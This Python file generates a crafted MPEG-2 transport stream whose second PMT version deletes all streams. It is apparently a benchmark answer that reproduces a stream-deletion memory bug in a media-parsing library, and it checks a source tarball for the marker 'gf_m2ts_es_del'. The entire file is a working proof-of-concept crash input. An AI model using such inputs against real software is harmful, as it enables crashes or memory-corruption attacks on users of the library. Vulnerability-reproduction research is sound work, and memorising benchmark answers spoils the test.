import os
import struct
import tarfile
import tempfile
from typing import List, Tuple


def _mpeg2_crc32_table() -> List[int]:
    poly = 0x04C11DB7
    table = []
    for i in range(256):
        crc = i << 24
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) & 0xFFFFFFFF) ^ poly
            else:
                crc = (crc << 1) & 0xFFFFFFFF
        table.append(crc)
    return table


_CRC_TABLE = _mpeg2_crc32_table()


def mpeg2_crc32(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for b in data:
        crc = ((crc << 8) & 0xFFFFFFFF) ^ _CRC_TABLE[((crc >> 24) ^ b) & 0xFF]
    return crc & 0xFFFFFFFF


def _psi_section_with_crc(section_wo_crc: bytes) -> bytes:
    crc = mpeg2_crc32(section_wo_crc)
    return section_wo_crc + struct.pack(">I", crc)


def make_pat_section(ts_id: int, version: int, programs: List[Tuple[int, int]]) -> bytes:
    # programs: list of (program_number, pmt_pid)
    sec_body = bytearray()
    sec_body += struct.pack(">H", ts_id & 0xFFFF)
    sec_body.append(0xC0 | ((version & 0x1F) << 1) | 0x01)  # current_next=1
    sec_body.append(0x00)  # section_number
    sec_body.append(0x00)  # last_section_number
    for prog_num, pmt_pid in programs:
        sec_body += struct.pack(">H", prog_num & 0xFFFF)
        sec_body.append(0xE0 | ((pmt_pid >> 8) & 0x1F))
        sec_body.append(pmt_pid & 0xFF)

    section_length = len(sec_body) + 4  # + CRC
    if section_length > 1021:
        raise ValueError("PAT too large")
    sec = bytearray()
    sec.append(0x00)  # table_id
    sec.append(0xB0 | ((section_length >> 8) & 0x0F))
    sec.append(section_length & 0xFF)
    sec += sec_body
    return _psi_section_with_crc(bytes(sec))


def make_pmt_section(program_number: int, version: int, pcr_pid: int, streams: List[Tuple[int, int]]) -> bytes:
    # streams: list of (stream_type, elementary_pid)
    sec_body = bytearray()
    sec_body += struct.pack(">H", program_number & 0xFFFF)
    sec_body.append(0xC0 | ((version & 0x1F) << 1) | 0x01)  # current_next=1
    sec_body.append(0x00)  # section_number
    sec_body.append(0x00)  # last_section_number
    sec_body.append(0xE0 | ((pcr_pid >> 8) & 0x1F))
    sec_body.append(pcr_pid & 0xFF)
    sec_body.append(0xF0)  # program_info_length high (reserved)
    sec_body.append(0x00)  # program_info_length low

    for stype, ep_pid in streams:
        sec_body.append(stype & 0xFF)
        sec_body.append(0xE0 | ((ep_pid >> 8) & 0x1F))
        sec_body.append(ep_pid & 0xFF)
        sec_body.append(0xF0)  # ES_info_length high (reserved)
        sec_body.append(0x00)  # ES_info_length low

    section_length = len(sec_body) + 4  # + CRC
    if section_length > 1021:
        raise ValueError("PMT too large")
    sec = bytearray()
    sec.append(0x02)  # table_id
    sec.append(0xB0 | ((section_length >> 8) & 0x0F))
    sec.append(section_length & 0xFF)
    sec += sec_body
    return _psi_section_with_crc(bytes(sec))


def make_ts_packet(pid: int, payload: bytes, pusi: bool, cc: int) -> bytes:
    if len(payload) > 184:
        raise ValueError("payload too large for single TS packet")
    b1 = 0x40 if pusi else 0x00
    b1 |= (pid >> 8) & 0x1F
    b2 = pid & 0xFF
    b3 = 0x10 | (cc & 0x0F)  # payload only
    header = bytes([0x47, b1, b2, b3])
    if len(payload) < 184:
        payload = payload + (b"\xFF" * (184 - len(payload)))
    return header + payload


def make_psi_packet(pid: int, section: bytes, cc: int) -> bytes:
    payload = bytes([0x00]) + section  # pointer_field=0
    return make_ts_packet(pid=pid, payload=payload, pusi=True, cc=cc)


def make_pes_packet(pid: int, stream_id: int, cc: int, payload_bytes: bytes) -> bytes:
    pes = bytearray()
    pes += b"\x00\x00\x01"
    pes.append(stream_id & 0xFF)
    pes += b"\x00\x00"  # PES_packet_length = 0 (unspecified)
    pes += b"\x80\x00\x00"  # '10' + flags, header_data_length=0
    pes += payload_bytes
    return make_ts_packet(pid=pid, payload=bytes(pes[:184]), pusi=True, cc=cc)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Optional: lightly validate we are likely dealing with the intended project; do not depend on it.
        try:
            if src_path and os.path.exists(src_path) and tarfile.is_tarfile(src_path):
                with tempfile.TemporaryDirectory() as td:
                    with tarfile.open(src_path, "r:*") as tf:
                        members = tf.getmembers()
                        # Extract only small subset for quick scan if present
                        for m in members[: min(200, len(members))]:
                            if m.isfile() and (m.name.endswith(".c") or m.name.endswith(".h")) and m.size <= 2_000_000:
                                tf.extract(m, td)
                        # scan extracted files for marker; ignore result
                        for root, _, files in os.walk(td):
                            for fn in files:
                                if fn.endswith((".c", ".h")):
                                    p = os.path.join(root, fn)
                                    try:
                                        with open(p, "rb") as f:
                                            if b"gf_m2ts_es_del" in f.read(200000):
                                                raise StopIteration
                                    except Exception:
                                        pass
        except StopIteration:
            pass
        except Exception:
            pass

        pmt_pid = 0x0100
        es1_pid = 0x0101
        es2_pid = 0x0102

        pat_v0 = make_pat_section(ts_id=1, version=0, programs=[(1, pmt_pid)])
        pmt_v0 = make_pmt_section(program_number=1, version=0, pcr_pid=es1_pid, streams=[(0x1B, es2_pid), (0x0F, es1_pid)])
        # PMT update removes all streams -> should trigger stream deletion
        pmt_v1 = make_pmt_section(program_number=1, version=1, pcr_pid=0x1FFF, streams=[])

        packets = []
        packets.append(make_psi_packet(pid=0x0000, section=pat_v0, cc=0))
        packets.append(make_psi_packet(pid=pmt_pid, section=pmt_v0, cc=0))
        packets.append(make_pes_packet(pid=es1_pid, stream_id=0xC0, cc=0, payload_bytes=b"\x00" * 16))
        packets.append(make_pes_packet(pid=es2_pid, stream_id=0xE0, cc=0, payload_bytes=b"\x00" * 16))
        packets.append(make_psi_packet(pid=pmt_pid, section=pmt_v1, cc=1))
        packets.append(make_ts_packet(pid=0x1FFF, payload=b"\xFF" * 184, pusi=False, cc=0))

        return b"".join(packets)